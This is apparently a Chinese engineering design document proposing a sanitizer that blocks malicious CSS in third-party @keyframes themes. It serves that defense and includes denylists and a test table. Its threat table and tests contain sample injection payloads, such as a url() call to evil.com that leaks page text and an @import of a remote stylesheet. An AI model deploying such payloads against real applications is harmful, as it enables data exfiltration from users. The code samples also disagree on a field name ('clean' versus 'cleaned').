# P0-2 · @keyframes CSS 注入防御护栏（FM-4.1）

> 状态: **待评审**
> 日期: 2026-08-22
> 关联 RFC: `2026-08-22-theme-compiler-unified.md`（λ 方案）
> 失效模式: FM-4.1 — 恶意 @keyframes CSS 注入导致 XSS
> 范围: `src/compiler/sanitize.ts`（新建）、`src/compiler/emit.ts`（修改）、`src/shared/token/animation-presets.ts`（修改）

---

## 1. 背景与目标

### 1.1 失效模式

主题市场的第三方主题可能在 `@keyframes` 中注入恶意 CSS，攻击向量包括：

| 向量 | 示例 | 危害 |
|------|------|------|
| **url() 数据窃取** | `@keyframes x { from { background: url('https://evil.com/steal?d='+document.body.innerText) } }` | 通过 CSS 背景图片请求外发页面内容 |
| **expression()** | `@keyframes x { from { behavior: expression(alert(1)) } }` | 旧 IE 可执行 JS；部分 Electron Chromium 版本仍解析 |
| **CSS 变量组合泄露** | `--leak: attr(data-sensitive); background: var(--leak)` 配合 animation 持续重绘 | 构造 CSS 数据泄露通道 |
| **@import 远程加载** | `@keyframes x{}; @import url('https://evil.com/malicious.css')` | 引入外部恶意样式表 |

### 1.2 当前证据

- `auroraGlassSignature()`（`scripts/theme-utils.mjs:774-792`）硬编码 3 个 `@keyframes`（`__aurora_glass_drift` / `__aurora_glass_sheen` / `__aurora_glass_breathe`），直接模板拼接颜色 token，无 sanitize 步骤
- λ 方案 §3.5 定义 5 个预设动画（`breathing` / `shimmer` / `pulse-glow` / `aurora-shift` / `caret-blink`），frames 字段为原始字符串
- λ 方案 §3.3 `KeyframeDeclaration.frames: string` — 用户声明的任意 CSS keyframes 内容直接输出到 emit 产物
- `hybrid-injector.mjs:155` 使用 `CSSStyleSheet.replaceSync(css)` 直接解析输入 CSS，绕过 CSP 对`<style>` 内联的限制

### 1.3 目标

1. **零注入**：所有进入编译器 emit 管线的 @keyframes 必须经过 sanitize 管道
2. **零依赖**：safe-css 模块使用纯 TypeScript 实现，不引入第三方解析库
3. **故障关闭（fail-closed）**：检测到违规时阻止输出而非静默放行
4. **兼容预设**：现有的 5 个预设动画颜色 token 注入方式不受影响

### 1.4 非目标

- 防御 CSP 绕过（由 Electron Content-Security-Policy header 独立承担）
- 防御 CSS 选择器注入（选择器白名单由适配器各自管理）
- 防御 `<style>` 标签 XSS（非 @keyframes 范畴）

---

## 2. 设计方案

### 2.1 Electron Chromium CSS 攻击面分析

| CSS 构造 | Chromium 120+ 支持 | Electron 28+ 支持 | 风险 |
|----------|:-----------------:|:-----------------:|:----:|
| `url()` 远程图片 | 是 | 是 | **数据窃取** |
| `expression()` | 已移除 | 已移除（但解析器不报错） | 低风险（兼容性构造可能复活） |
| `@import url(...)` | 是 | 是 | **远程加载** |
| `@apply` | 未实现 | 未实现 | 低风险（但可能注入 mixin 语义） |
| `--custom-property` 引用外部变量 | 是 | 是 | **变量逃逸** |
| `behavior` (HTC) | 未实现 | 未实现 | 低风险 |
| `@supports` 嵌套 | 是 | 是 | 条件规避 |
| `@layer` | 是 | 是 | 优先级攻击 |

### 2.2 safe-css 模块设计

#### 文件位置

```
src/compiler/sanitize.ts        ← 纯函数，零依赖
src/compiler/sanitize.test.ts   ← 单元测试
```

#### 核心类型

```typescript
interface SanitizeOptions {
  /** 允许的 CSS 属性名集合（allowlist 模式） */
  allowedProperties?: Set<string>;
  /** 禁止的 CSS 属性名集合（denylist 模式） */
  forbiddenProperties?: Set<string>;
  /** 最大关键帧数（默认 100） */
  maxKeyframeStops?: number;
  /** 允许的 CSS 函数名集合 */
  allowedFunctions?: Set<string>;
  /** 命名空间前缀，用于冲突时重命名 */
  namespacePrefix?: string;
  /** 染色用的调色板 token 是否允许（内部属性） */
  allowPaletteTokens?: boolean;
}

interface SanitizeResult {
  /** sanitize 后的 CSS 字符串（命名与 src/shared/safe-css.ts 既有接口保持一致） */
  clean: string;
  /** 违规描述列表 */
  violations: string[];
  /** 是否存在阻塞性违规 */
  isBlocked: boolean;
}
```

#### 核心签名

```typescript
function sanitizeKeyframes(raw: string, opts: SanitizeOptions): SanitizeResult;
```

#### 解析策略：自研 PEG-lite 逐字符扫描

**选型依据**（对比三种方案）：

| 方案 | 依赖体积 | 适用性 | 决策 |
|------|:-------:|--------|------|
| css-tree | 80 KB | AST 级精确解析 | 体积大，功能超配 |
| PostCSS | 120 KB | 完整 CSS 解析 | 同上 |
| **自研 PEG-lite** | **0 KB** | **@keyframes 专用子集** | **采用** |

自研扫描器仅处理 `@keyframes` 规则子集，状态机逻辑约 150 行：

```
扫描流程：
  输入 CSS 字符串
    → 提取 @keyframes <name> { ... } 块
    → 对每块的 declarations 逐属性扫描
    → 属性名 check: 命中 denylist → block；命中 allowlist-外 → warn
    → 属性值 check: 检测到 url() / expression() / @import / @apply / behavior → block
    → 变量引用 check: --external-* 模式匹配 → block
    → 帧数 count: > maxKeyframeStops → warn（不 block）
    → 名称冲突 check: 与 system 预设名冲突 → rename + warn
    → 输出 cleaned + violations + isBlocked
```

#### 规则集

**属性 allowlist（keyframes 内允许）**：
- `background` / `background-color` / `color` / `opacity`
- `transform` / `box-shadow` / `filter`
- `background-position` / `background-size`

**属性 denylist（禁止）**：
- `behavior` / `cursor`（可加载远程 `.cur`）
- `content`（伪元素文本注入）
- `binding`（XBL，旧 Firefox）

**函数 denylist（禁止）**：
- `url()` / `expression()` / `var(--external`
- `@import` / `@apply` / `theme()`

**命名冲突消解**：当 keyframes 名命中 `agentskin-*` 前缀时，自动重命名为 `agentskin-usr-<hash4>-<原名>`。

### 2.3 emit.ts 接入点

```typescript
// src/compiler/emit.ts（示意，实际改动时实现）
import { sanitizeKeyframes, DEFAULT_KEYFRAME_OPTS } from './sanitize';

function emitKeyframes(declarations: KeyframeDeclaration[]): string {
  const out: string[] = [];
  for (const decl of declarations) {
    const result = sanitizeKeyframes(decl.frames, DEFAULT_KEYFRAME_OPTS);
    if (result.isBlocked) {
      emitViolationLog(decl.name, result.violations);
      continue; // 故障关闭：跳过该 keyframes
    }
    out.push(`@keyframes ${decl.name} { ${result.cleaned} }`);
    if (result.violations.length > 0) {
      emitWarningLog(decl.name, result.violations);
    }
  }
  return out.join('\n');
}
```

### 2.4 animation-presets.ts 防御性接入

```typescript
// src/shared/token/animation-presets.ts（示意）
import { sanitizeKeyframes, PRESET_KEYFRAME_OPTS } from '../../compiler/sanitize';

export const ANIMATION_PRESETS: Record<AnimationId, SafeKeyframeDeclaration> = {
  breathing: {
    name: 'agentskin-breathing',
    frames: sanitizeKeyframes(`0%,100%{opacity:.6}50%{opacity:1}`, PRESET_KEYFRAME_OPTS).cleaned,
  },
  // ...其余 4 个预设同理
};
```

预设动画走 sanitize 是防御性编程——当前预设 frames 是硬编码常量，但未来可能从配置文件加载。

---

## 3. 测试用例设计

| # | 用例 | 输入 | 期望结果 |
|---|------|------|----------|
| T1 | 正常 keyframes | `0%{opacity:0}100%{opacity:1}` | pass，cleaned ≡ 输入 |
| T2 | url() 数据窃取 | `0%{background:url('https://evil.com/x?d='+document.body.innerText)}` | block，violations 含 `url()` |
| T3 | expression() 攻击 | `0%{behavior:expression(alert(1))}` | block，violations 含 `expression()` |
| T4 | CSS 变量逃逸 | `0%{background:var(--external-leak)}` | block，violations 含 `--external` |
| T5 | @import 注入 | `@keyframes x{} @import url('evil.css')` | block，violations 含 `@import` |
| T6 | 超长 keyframes | 101 帧 `0%..100%` | warn（不 block），violations 含 `maxKeyframeStops` |
| T7 | 名称冲突 | name = `agentskin-breathing` | rename 为 `agentskin-usr-a1b2-breathing`，warn |
| T8 | 预设动画兼容 | `0%,100%{opacity:.6}50%{opacity:1}` | pass，cleaned ≡ 输入 |
| T9 | 混合合法+非法属性 | `0%{opacity:0;behavior:expression(x)}` | block，仅报告 behavior 违规 |
| T10 | 空输入 | `''` | pass，cleaned = ''，violations = [] |
| T11 | 嵌套 @supports 规避 | `@supports (display:grid){0%{background:url(x)}}` | block，violations 含 `url()` |
| T12 | 颜色 token 注入 | `0%{background:var(--agentskin-accent)}` | pass（allowPaletteTokens=true 时） |

---

## 4. 代码改动点（仅列出，不修改）

| 操作 | 文件 | 说明 |
|------|------|------|
| **新增** | `src/compiler/sanitize.ts` | 纯函数模块，~200 行，零依赖 |
| **新增** | `src/compiler/sanitize.test.ts` | 12 个测试用例（T1-T12） |
| **修改** | `src/compiler/emit.ts` | 在 raw keyframes 输出前调用 `sanitizeKeyframes()` |
| **修改** | `src/shared/token/animation-presets.ts` | 5 个预设 frames 经 sanitize 后输出（防御性） |
| **新增** | `scripts/check-keyframes-sanitize.mjs` | 校验脚本：扫描 themes/ 下所有 CSS 文件，报告未 sanitize 的 @keyframes |

---

## 5. 风险与兜底

| # | 风险 | 等级 | 触发条件 | 兜底策略 | 检测机制 |
|---|:----:|:----:|----------|----------|----------|
| R1 | 自研解析器误判合法属性 | P2 | 新 CSS 属性（如 `offset-path`）不在 allowlist | 默认 allowlist 模式 + 可配置扩展 | T1-T12 回归测试 |
| R2 | sanitize 性能瓶颈 | P3 | 超大 keyframes（>1000 帧） | 帧数上限 + 超时截断 | 性能基准测试 |
| R3 | 预设动画重命名导致引用断裂 | P2 | animation 名称引用与 @keyframes 名不一致 | 重命名时同步更新 animation 属性 | 集成测试 |
| R4 | 绕过：CSS 注释混淆 | P3 | `url(/\\*evil\\*/)` 等混淆 | 扫描前 strip comments | T11 测试覆盖 |

---

## 6. 分批落地计划

| Phase | 周期 | 交付物 | 验证方式 |
|:-----:|:----:|--------|----------|
| S1 | 2 天 | `sanitize.ts` + 12 测试用例 | `npm test` 全绿 |
| S2 | 1 天 | `emit.ts` 接入 + `animation-presets.ts` 防御性接入 | 5 预设动画产物 byte-identical |
| S3 | 1 天 | `check-keyframes-sanitize.mjs` 校验脚本 | `npm run check` 全绿 |
| S4 | 1 天 | 集成测试：恶意主题包注入尝试被 block | E2E 测试通过 |

---

## 7. 人工复核项

| # | 假设 | 验证难度 | 建议 |
|---|:----:|:--------:|------|
| H1 | Electron 目标版本（28+）Chromium 已完全移除 expression() | 低 | 在 packaged app 中注入测试用例 T3 确认 |
| H2 | `CSSStyleSheet.replaceSync()` 对 url() 请求的实际行为 | 中 | 在 WorkBuddy 宿主中注入 T2 测试用例，抓包确认 |
| H3 | allowlist 是否覆盖所有合法 keyframes 属性需求 | 中 | 在 Theme Studio 导出流程中灰度验证 |

---

## 8. 评审结论

（评审意见汇总，由评审人填写）

---

> 本护栏作为 λ 方案（主题编译器统一化）的安全前置条件，应在 λ-4（动画注册框架）之前完成。未批前不改代码。
